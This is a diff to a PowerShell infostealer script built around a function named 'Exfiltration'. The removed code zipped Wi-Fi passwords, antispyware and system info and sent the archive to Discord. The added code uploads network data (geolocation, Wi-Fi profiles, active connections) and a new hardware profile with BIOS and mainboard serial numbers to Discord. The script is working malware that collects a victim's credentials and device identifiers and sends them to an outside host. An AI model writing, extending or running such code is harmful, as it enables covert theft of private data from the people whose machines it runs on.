@@ -60,28 +60,14 @@ function Exfiltration {
     #Call Get-StorageAndTreeInfo
     StorageAndTreeInfo
 
-    #Call NetworkInfo
-    NetworkInfo
+    # Call the function to get network information
+    $networkInfoPath = NetworkInfo
+    # Upload NetworkInfo.txt to Discord
+    Upload-Discord -file $networkInfoPath -text "Network Information :"
 
+    #Call HardwareInfo
+    HardwareInfo
 
-    ## Create a zip archive with the specified files
-  try {
-      $timestamp = (Get-Date).ToString("dd_MM_yyyy_HHmm")
-      $zipFileName = "Exfil_$env:USERNAME_$timestamp.zip"
-      $zipFilePath = Join-Path "C:\temp" $zipFileName
-
-      Compress-Archive -Path "C:\temp\AntiSpyware.txt", "C:\temp\Wifi_Passwords.txt", "C:\temp\Storage_Info.txt", "C:\temp\System_Informations.txt", $networkInfoPath -DestinationPath $zipFilePath
-
-    # Upload the zip archive to Discord
-      Upload-Discord -file $zipFilePath -text "Exfiltration Archive :"
-
-    # Remove the zip file
-      Remove-Item -Path $zipFilePath -Force
-  } catch {
-    # If an error occurs, send the error message to Discord
-    $errorMessage = "Error during exfiltration process: $_"
-    Upload-Discord -text $errorMessage
-}
 
     
 }
@@ -329,7 +315,7 @@ function NetworkInfo {
     } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
 
     # Output to a text file
-    $outputPath = Join-Path $env:TEMP "NetworkInfo.txt"
+    $HardwareInfoPath = Join-Path $env:TEMP "NetworkInfo.txt"
     @(
         "Geo-Location Information:",
         "    Latitude: $Lat",
@@ -345,17 +331,130 @@ function NetworkInfo {
         "$wifiProfiles",
         "Listeners / Active TCP Connections:",
         "$listener"
-    ) | Out-File -FilePath $outputPath
+    ) | Out-File -FilePath $HardwareInfoPath
 
     # Return the output path
-    $outputPath
+    $HardwareInfoPath
 }
 
-# Call the function to get network information
-$networkInfoPath = NetworkInfo
+function HardwareInfo {
+    # Get computer system information
+    $computerSystem = Get-CimInstance CIM_ComputerSystem
 
-# Upload NetworkInfo.txt to Discord
-Upload-Discord -file $networkInfoPath -text "Network Information :"
+    # Get BIOS information
+    $bios = Get-CimInstance CIM_BIOSElement
+
+    # Get operating system information
+    $operatingSystem = Get-WmiObject Win32_OperatingSystem
+
+    # Get CPU information
+    $cpu = Get-WmiObject Win32_Processor
+
+    # Get mainboard information
+    $mainboard = Get-WmiObject Win32_BaseBoard
+
+    # Get RAM information
+    $ram = Get-WmiObject Win32_PhysicalMemory
+
+    # Get video card information
+    $videoCard = Get-WmiObject Win32_VideoController
+
+    # Create the output content
+    $output = @"
+------------------------------------------------------------------------------------------------------------------------------
+
+Computer Name:
+$($computerSystem.Name)
+
+Model:
+$($computerSystem.Model)
+
+Manufacturer:
+$($computerSystem.Manufacturer)
+
+BIOS:
+
+
+SMBIOSBIOSVersion : $($bios.SMBIOSBIOSVersion)
+Manufacturer      : $($bios.Manufacturer)
+Name              : $($bios.Name)
+SerialNumber      : $($bios.SerialNumber)
+Version           : $($bios.Version)
+
+
+
+
+
+OS:
+
+Caption                            Version   
+-------                            -------   
+$($operatingSystem.Caption) $($operatingSystem.Version)
+
+
+
+
+CPU:
+
+
+DeviceID      : $($cpu.DeviceID)
+Name          : $($cpu.Name)
+Caption       : $($cpu.Caption)
+Manufacturer  : $($cpu.Manufacturer)
+MaxClockSpeed : $($cpu.MaxClockSpeed)
+L2CacheSize   : $($cpu.L2CacheSize)
+L2CacheSpeed  : $($cpu.L2CacheSpeed)
+L3CacheSize   : $($cpu.L3CacheSize)
+L3CacheSpeed  : $($cpu.L3CacheSpeed)
+
+
+
+
+
+Mainboard:
+
+
+Manufacturer : $($mainboard.Manufacturer)
+Model        : $($mainboard.Model)
+Name         : $($mainboard.Name)
+SerialNumber : $($mainboard.SerialNumber)
+SKU          : $($mainboard.SKU)
+Product      : $($mainboard.Product)
+
+
+
+
+
+Ram Capacity:
+$("{0:N1} GB" -f ($ram | Measure-Object -Property Capacity -Sum).Sum / 1GB)
+
+
+Total installed Ram:
+
+$($ram | ForEach-Object { "$($_.DeviceLocator) $("{0:N1} GB" -f ($_.Capacity / 1GB))" } | Format-Table | Out-String)
+
+
+
+
+Video Card: 
+
+Name                 VideoProcessor                 DriverVersion CurrentHorizontalResolution CurrentVerticalResolution
+----                 --------------                 ------------- --------------------------- -------------------------
+$($videoCard.Name) $($videoCard.VideoProcessor) $($videoCard.DriverVersion) $($videoCard.CurrentHorizontalResolution) $($videoCard.CurrentVerticalResolution)
+
+"@
+
+    # Save the output to Hardware_Info.txt
+    $HardwareInfoPath = "C:\temp\Hardware_Info.txt"
+    $output | Out-File -FilePath $HardwareInfoPath -Encoding utf8
+
+    # Display the output path
+    $HardwareInfoPath
+
+    # Upload Storage_Info.txt to Discord
+    Upload-Discord -file $HardwareInfoPath -text "Hardware Informations :"
+    
+}
 
 
 
